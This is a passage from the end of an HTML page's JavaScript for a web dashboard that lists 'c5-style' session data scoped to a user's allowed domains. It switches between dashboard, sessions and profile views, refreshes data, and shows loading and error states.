                    : 'Browse the same c5-style session data, filtered to your main domain and matching subdomains.'
            );
        }
    }

    function setFilter(filter) {
        currentFilter = filter;
        if (currentPage === 'dashboard' || currentPage === 'sessions') {
            renderWorkspace(
                currentPage === 'dashboard' ? 'Session Overview' : 'All Visible Sessions',
                currentPage === 'dashboard'
                    ? 'This view follows the c5 session layout and only shows sessions inside your allowed domain scope.'
                    : 'Browse the same c5-style session data, filtered to your main domain and matching subdomains.'
            );
        }
    }

    async function refreshCurrentPage(forceReload = false) {
        if (currentPage === 'profile') {
            renderProfile();
            return;
        }

        $('#pageContent').html('<div class="loading"><div class="spinner"></div>Loading session data...</div>');

        try {
            await fetchDashboardData(forceReload);
            renderWorkspace(
                currentPage === 'dashboard' ? 'Session Overview' : 'All Visible Sessions',
                currentPage === 'dashboard'
                    ? 'This view follows the c5 session layout and only shows sessions inside your allowed domain scope.'
                    : 'Browse the same c5-style session data, filtered to your main domain and matching subdomains.'
            );
            if (forceReload) showToast('Session data refreshed', 'success');
        } catch (error) {
            $('#pageContent').html('<div class="alert alert-danger">Error loading sessions: ' + escapeHtml(error.message) + '</div>');
        }
    }

    function loadPage(page) {
        currentPage = page;
        $('.menu-item').removeClass('active');
        $(`.menu-item[data-page="${page}"]`).addClass('active');

        if (page === 'dashboard') {
            $('#pageTitle').text('Dashboard');
            $('#pageDesc').text('View live sessions for your allowed domains.');
            refreshCurrentPage(false);
        } else if (page === 'sessions') {
            $('#pageTitle').text('Sessions');
            $('#pageDesc').text('Search and inspect c5-style session data within your domain scope.');
            refreshCurrentPage(false);
        } else if (page === 'profile') {
            $('#pageTitle').text('Profile');
            $('#pageDesc').text('Review your account and current domain visibility.');
            renderProfile();
        }
    }

    $(document).ready(function() {
        $('.menu-item').click(function() {
            loadPage($(this).data('page'));
        });
        loadPage('dashboard');
    });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
